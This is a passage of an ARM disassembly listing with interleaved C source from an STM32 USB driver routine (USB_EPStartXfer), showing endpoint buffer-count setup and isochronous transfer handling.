 8007a34:	691b      	ldr	r3, [r3, #16]
 8007a36:	2b3e      	cmp	r3, #62	; 0x3e
 8007a38:	d92b      	bls.n	8007a92 <USB_EPStartXfer+0x1008>
 8007a3a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a3e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a42:	681b      	ldr	r3, [r3, #0]
 8007a44:	691b      	ldr	r3, [r3, #16]
 8007a46:	095b      	lsrs	r3, r3, #5
 8007a48:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a50:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a54:	681b      	ldr	r3, [r3, #0]
 8007a56:	691b      	ldr	r3, [r3, #16]
 8007a58:	f003 031f 	and.w	r3, r3, #31
 8007a5c:	2b00      	cmp	r3, #0
 8007a5e:	d104      	bne.n	8007a6a <USB_EPStartXfer+0xfe0>
 8007a60:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a64:	3b01      	subs	r3, #1
 8007a66:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a6a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a6e:	881b      	ldrh	r3, [r3, #0]
 8007a70:	b29a      	uxth	r2, r3
 8007a72:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a76:	b29b      	uxth	r3, r3
 8007a78:	029b      	lsls	r3, r3, #10
 8007a7a:	b29b      	uxth	r3, r3
 8007a7c:	4313      	orrs	r3, r2
 8007a7e:	b29b      	uxth	r3, r3
 8007a80:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a84:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a88:	b29a      	uxth	r2, r3
 8007a8a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a8e:	801a      	strh	r2, [r3, #0]
 8007a90:	e070      	b.n	8007b74 <USB_EPStartXfer+0x10ea>
 8007a92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a9a:	681b      	ldr	r3, [r3, #0]
 8007a9c:	691b      	ldr	r3, [r3, #16]
 8007a9e:	2b00      	cmp	r3, #0
 8007aa0:	d10c      	bne.n	8007abc <USB_EPStartXfer+0x1032>
 8007aa2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007aa6:	881b      	ldrh	r3, [r3, #0]
 8007aa8:	b29b      	uxth	r3, r3
 8007aaa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007aae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007ab2:	b29a      	uxth	r2, r3
 8007ab4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007ab8:	801a      	strh	r2, [r3, #0]
 8007aba:	e05b      	b.n	8007b74 <USB_EPStartXfer+0x10ea>
 8007abc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ac0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ac4:	681b      	ldr	r3, [r3, #0]
 8007ac6:	691b      	ldr	r3, [r3, #16]
 8007ac8:	085b      	lsrs	r3, r3, #1
 8007aca:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007ace:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ad2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ad6:	681b      	ldr	r3, [r3, #0]
 8007ad8:	691b      	ldr	r3, [r3, #16]
 8007ada:	f003 0301 	and.w	r3, r3, #1
 8007ade:	2b00      	cmp	r3, #0
 8007ae0:	d004      	beq.n	8007aec <USB_EPStartXfer+0x1062>
 8007ae2:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007ae6:	3301      	adds	r3, #1
 8007ae8:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007aec:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007af0:	881b      	ldrh	r3, [r3, #0]
 8007af2:	b29a      	uxth	r2, r3
 8007af4:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007af8:	b29b      	uxth	r3, r3
 8007afa:	029b      	lsls	r3, r3, #10
 8007afc:	b29b      	uxth	r3, r3
 8007afe:	4313      	orrs	r3, r2
 8007b00:	b29a      	uxth	r2, r3
 8007b02:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007b06:	801a      	strh	r2, [r3, #0]
 8007b08:	e034      	b.n	8007b74 <USB_EPStartXfer+0x10ea>
 8007b0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b0e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b12:	681b      	ldr	r3, [r3, #0]
 8007b14:	785b      	ldrb	r3, [r3, #1]
 8007b16:	2b01      	cmp	r3, #1
 8007b18:	d12c      	bne.n	8007b74 <USB_EPStartXfer+0x10ea>
 8007b1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b1e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b22:	681b      	ldr	r3, [r3, #0]
 8007b24:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007b28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b2c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b30:	681b      	ldr	r3, [r3, #0]
 8007b32:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b36:	b29b      	uxth	r3, r3
 8007b38:	461a      	mov	r2, r3
 8007b3a:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007b3e:	4413      	add	r3, r2
 8007b40:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007b44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b48:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b4c:	681b      	ldr	r3, [r3, #0]
 8007b4e:	781b      	ldrb	r3, [r3, #0]
 8007b50:	00da      	lsls	r2, r3, #3
 8007b52:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007b56:	4413      	add	r3, r2
 8007b58:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007b5c:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007b60:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b68:	681b      	ldr	r3, [r3, #0]
 8007b6a:	691b      	ldr	r3, [r3, #16]
 8007b6c:	b29a      	uxth	r2, r3
 8007b6e:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007b72:	801a      	strh	r2, [r3, #0]
 8007b74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b78:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b7c:	681b      	ldr	r3, [r3, #0]
 8007b7e:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007b82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b8a:	681b      	ldr	r3, [r3, #0]
 8007b8c:	785b      	ldrb	r3, [r3, #1]
 8007b8e:	2b00      	cmp	r3, #0
 8007b90:	f040 809d 	bne.w	8007cce <USB_EPStartXfer+0x1244>
 8007b94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b98:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b9c:	681b      	ldr	r3, [r3, #0]
 8007b9e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007ba2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ba6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007baa:	681b      	ldr	r3, [r3, #0]
 8007bac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007bb0:	b29b      	uxth	r3, r3
 8007bb2:	461a      	mov	r2, r3
 8007bb4:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007bb8:	4413      	add	r3, r2
 8007bba:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007bbe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bc2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bc6:	681b      	ldr	r3, [r3, #0]
 8007bc8:	781b      	ldrb	r3, [r3, #0]
 8007bca:	00da      	lsls	r2, r3, #3
 8007bcc:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007bd0:	4413      	add	r3, r2
 8007bd2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007bd6:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007bda:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bde:	881b      	ldrh	r3, [r3, #0]
 8007be0:	b29b      	uxth	r3, r3
 8007be2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007be6:	b29a      	uxth	r2, r3
 8007be8:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bec:	801a      	strh	r2, [r3, #0]
 8007bee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bf2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bf6:	681b      	ldr	r3, [r3, #0]
 8007bf8:	691b      	ldr	r3, [r3, #16]
 8007bfa:	2b3e      	cmp	r3, #62	; 0x3e
 8007bfc:	d92b      	bls.n	8007c56 <USB_EPStartXfer+0x11cc>
 8007bfe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c02:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c06:	681b      	ldr	r3, [r3, #0]
 8007c08:	691b      	ldr	r3, [r3, #16]
 8007c0a:	095b      	lsrs	r3, r3, #5
 8007c0c:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c14:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c18:	681b      	ldr	r3, [r3, #0]
 8007c1a:	691b      	ldr	r3, [r3, #16]
 8007c1c:	f003 031f 	and.w	r3, r3, #31
 8007c20:	2b00      	cmp	r3, #0
 8007c22:	d104      	bne.n	8007c2e <USB_EPStartXfer+0x11a4>
 8007c24:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c28:	3b01      	subs	r3, #1
 8007c2a:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c2e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c32:	881b      	ldrh	r3, [r3, #0]
 8007c34:	b29a      	uxth	r2, r3
 8007c36:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c3a:	b29b      	uxth	r3, r3
 8007c3c:	029b      	lsls	r3, r3, #10
 8007c3e:	b29b      	uxth	r3, r3
 8007c40:	4313      	orrs	r3, r2
 8007c42:	b29b      	uxth	r3, r3
 8007c44:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c48:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c4c:	b29a      	uxth	r2, r3
 8007c4e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c52:	801a      	strh	r2, [r3, #0]
 8007c54:	e069      	b.n	8007d2a <USB_EPStartXfer+0x12a0>
 8007c56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c5a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c5e:	681b      	ldr	r3, [r3, #0]
 8007c60:	691b      	ldr	r3, [r3, #16]
 8007c62:	2b00      	cmp	r3, #0
 8007c64:	d10c      	bne.n	8007c80 <USB_EPStartXfer+0x11f6>
 8007c66:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c6a:	881b      	ldrh	r3, [r3, #0]
 8007c6c:	b29b      	uxth	r3, r3
 8007c6e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c72:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c76:	b29a      	uxth	r2, r3
 8007c78:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c7c:	801a      	strh	r2, [r3, #0]
 8007c7e:	e054      	b.n	8007d2a <USB_EPStartXfer+0x12a0>
 8007c80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c88:	681b      	ldr	r3, [r3, #0]
 8007c8a:	691b      	ldr	r3, [r3, #16]
 8007c8c:	085b      	lsrs	r3, r3, #1
 8007c8e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c9a:	681b      	ldr	r3, [r3, #0]
 8007c9c:	691b      	ldr	r3, [r3, #16]
 8007c9e:	f003 0301 	and.w	r3, r3, #1
 8007ca2:	2b00      	cmp	r3, #0
 8007ca4:	d004      	beq.n	8007cb0 <USB_EPStartXfer+0x1226>
 8007ca6:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007caa:	3301      	adds	r3, #1
 8007cac:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007cb0:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007cb4:	881b      	ldrh	r3, [r3, #0]
 8007cb6:	b29a      	uxth	r2, r3
 8007cb8:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007cbc:	b29b      	uxth	r3, r3
 8007cbe:	029b      	lsls	r3, r3, #10
 8007cc0:	b29b      	uxth	r3, r3
 8007cc2:	4313      	orrs	r3, r2
 8007cc4:	b29a      	uxth	r2, r3
 8007cc6:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007cca:	801a      	strh	r2, [r3, #0]
 8007ccc:	e02d      	b.n	8007d2a <USB_EPStartXfer+0x12a0>
 8007cce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cd6:	681b      	ldr	r3, [r3, #0]
 8007cd8:	785b      	ldrb	r3, [r3, #1]
 8007cda:	2b01      	cmp	r3, #1
 8007cdc:	d125      	bne.n	8007d2a <USB_EPStartXfer+0x12a0>
 8007cde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ce2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ce6:	681b      	ldr	r3, [r3, #0]
 8007ce8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007cec:	b29b      	uxth	r3, r3
 8007cee:	461a      	mov	r2, r3
 8007cf0:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007cf4:	4413      	add	r3, r2
 8007cf6:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007cfa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cfe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d02:	681b      	ldr	r3, [r3, #0]
 8007d04:	781b      	ldrb	r3, [r3, #0]
 8007d06:	00da      	lsls	r2, r3, #3
 8007d08:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007d0c:	4413      	add	r3, r2
 8007d0e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007d12:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007d16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d1a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d1e:	681b      	ldr	r3, [r3, #0]
 8007d20:	691b      	ldr	r3, [r3, #16]
 8007d22:	b29a      	uxth	r2, r3
 8007d24:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007d28:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007d2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d2e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d32:	681b      	ldr	r3, [r3, #0]
 8007d34:	69db      	ldr	r3, [r3, #28]
 8007d36:	2b00      	cmp	r3, #0
 8007d38:	f000 8218 	beq.w	800816c <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007d3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d40:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d44:	681a      	ldr	r2, [r3, #0]
 8007d46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d4a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d4e:	681b      	ldr	r3, [r3, #0]
 8007d50:	781b      	ldrb	r3, [r3, #0]
 8007d52:	009b      	lsls	r3, r3, #2
 8007d54:	4413      	add	r3, r2
 8007d56:	881b      	ldrh	r3, [r3, #0]
 8007d58:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d5c:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d60:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007d64:	2b00      	cmp	r3, #0
 8007d66:	d005      	beq.n	8007d74 <USB_EPStartXfer+0x12ea>
 8007d68:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d6c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d70:	2b00      	cmp	r3, #0
 8007d72:	d10d      	bne.n	8007d90 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d74:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d78:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d7c:	2b00      	cmp	r3, #0
 8007d7e:	f040 81f5 	bne.w	800816c <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d82:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d86:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d8a:	2b00      	cmp	r3, #0
 8007d8c:	f040 81ee 	bne.w	800816c <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d94:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d98:	681a      	ldr	r2, [r3, #0]
 8007d9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007da2:	681b      	ldr	r3, [r3, #0]
 8007da4:	781b      	ldrb	r3, [r3, #0]
 8007da6:	009b      	lsls	r3, r3, #2
 8007da8:	4413      	add	r3, r2
 8007daa:	881b      	ldrh	r3, [r3, #0]
 8007dac:	b29b      	uxth	r3, r3
 8007dae:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007db2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007db6:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007dba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dbe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007dc2:	681a      	ldr	r2, [r3, #0]
 8007dc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dcc:	681b      	ldr	r3, [r3, #0]
 8007dce:	781b      	ldrb	r3, [r3, #0]
 8007dd0:	009b      	lsls	r3, r3, #2
 8007dd2:	441a      	add	r2, r3
 8007dd4:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007dd8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007ddc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007de0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007de4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007de8:	b29b      	uxth	r3, r3
 8007dea:	8013      	strh	r3, [r2, #0]
 8007dec:	e1be      	b.n	800816c <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007dee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007df2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df6:	681b      	ldr	r3, [r3, #0]
 8007df8:	78db      	ldrb	r3, [r3, #3]
 8007dfa:	2b01      	cmp	r3, #1
 8007dfc:	f040 81b4 	bne.w	8008168 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007e00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e08:	681b      	ldr	r3, [r3, #0]
 8007e0a:	699a      	ldr	r2, [r3, #24]
 8007e0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e14:	681b      	ldr	r3, [r3, #0]
 8007e16:	691b      	ldr	r3, [r3, #16]
 8007e18:	429a      	cmp	r2, r3
 8007e1a:	d917      	bls.n	8007e4c <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007e1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e20:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e24:	681b      	ldr	r3, [r3, #0]
 8007e26:	691b      	ldr	r3, [r3, #16]
 8007e28:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007e2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e34:	681b      	ldr	r3, [r3, #0]
 8007e36:	699a      	ldr	r2, [r3, #24]
 8007e38:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e3c:	1ad2      	subs	r2, r2, r3
 8007e3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e46:	681b      	ldr	r3, [r3, #0]
 8007e48:	619a      	str	r2, [r3, #24]
 8007e4a:	e00e      	b.n	8007e6a <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007e4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e50:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e54:	681b      	ldr	r3, [r3, #0]
 8007e56:	699b      	ldr	r3, [r3, #24]
 8007e58:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007e5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e64:	681b      	ldr	r3, [r3, #0]
 8007e66:	2200      	movs	r2, #0
 8007e68:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007e6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e72:	681b      	ldr	r3, [r3, #0]
 8007e74:	785b      	ldrb	r3, [r3, #1]
 8007e76:	2b00      	cmp	r3, #0
 8007e78:	f040 8085 	bne.w	8007f86 <USB_EPStartXfer+0x14fc>
 8007e7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e80:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e84:	681b      	ldr	r3, [r3, #0]
 8007e86:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e8e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e92:	681b      	ldr	r3, [r3, #0]
 8007e94:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e98:	b29b      	uxth	r3, r3
 8007e9a:	461a      	mov	r2, r3
 8007e9c:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007ea0:	4413      	add	r3, r2
 8007ea2:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007ea6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007eaa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007eae:	681b      	ldr	r3, [r3, #0]
 8007eb0:	781b      	ldrb	r3, [r3, #0]
 8007eb2:	00da      	lsls	r2, r3, #3
 8007eb4:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007eb8:	4413      	add	r3, r2
 8007eba:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007ebe:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007ec2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ec6:	881b      	ldrh	r3, [r3, #0]
 8007ec8:	b29b      	uxth	r3, r3
 8007eca:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007ece:	b29a      	uxth	r2, r3
 8007ed0:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ed4:	801a      	strh	r2, [r3, #0]
 8007ed6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eda:	2b3e      	cmp	r3, #62	; 0x3e
 8007edc:	d923      	bls.n	8007f26 <USB_EPStartXfer+0x149c>
 8007ede:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ee2:	095b      	lsrs	r3, r3, #5
 8007ee4:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ee8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eec:	f003 031f 	and.w	r3, r3, #31
 8007ef0:	2b00      	cmp	r3, #0
 8007ef2:	d104      	bne.n	8007efe <USB_EPStartXfer+0x1474>
 8007ef4:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ef8:	3b01      	subs	r3, #1
 8007efa:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007efe:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f02:	881b      	ldrh	r3, [r3, #0]
 8007f04:	b29a      	uxth	r2, r3
 8007f06:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f0a:	b29b      	uxth	r3, r3
 8007f0c:	029b      	lsls	r3, r3, #10
 8007f0e:	b29b      	uxth	r3, r3
 8007f10:	4313      	orrs	r3, r2
 8007f12:	b29b      	uxth	r3, r3
 8007f14:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007f18:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007f1c:	b29a      	uxth	r2, r3
 8007f1e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f22:	801a      	strh	r2, [r3, #0]
 8007f24:	e060      	b.n	8007fe8 <USB_EPStartXfer+0x155e>
 8007f26:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f2a:	2b00      	cmp	r3, #0
 8007f2c:	d10c      	bne.n	8007f48 <USB_EPStartXfer+0x14be>
 8007f2e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f32:	881b      	ldrh	r3, [r3, #0]
 8007f34:	b29b      	uxth	r3, r3
 8007f36:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007f3a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007f3e:	b29a      	uxth	r2, r3
 8007f40:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f44:	801a      	strh	r2, [r3, #0]
 8007f46:	e04f      	b.n	8007fe8 <USB_EPStartXfer+0x155e>
 8007f48:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f4c:	085b      	lsrs	r3, r3, #1
 8007f4e:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f52:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f56:	f003 0301 	and.w	r3, r3, #1
 8007f5a:	2b00      	cmp	r3, #0
 8007f5c:	d004      	beq.n	8007f68 <USB_EPStartXfer+0x14de>
 8007f5e:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f62:	3301      	adds	r3, #1
 8007f64:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f68:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f6c:	881b      	ldrh	r3, [r3, #0]
 8007f6e:	b29a      	uxth	r2, r3
 8007f70:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f74:	b29b      	uxth	r3, r3
 8007f76:	029b      	lsls	r3, r3, #10
 8007f78:	b29b      	uxth	r3, r3
 8007f7a:	4313      	orrs	r3, r2
 8007f7c:	b29a      	uxth	r2, r3
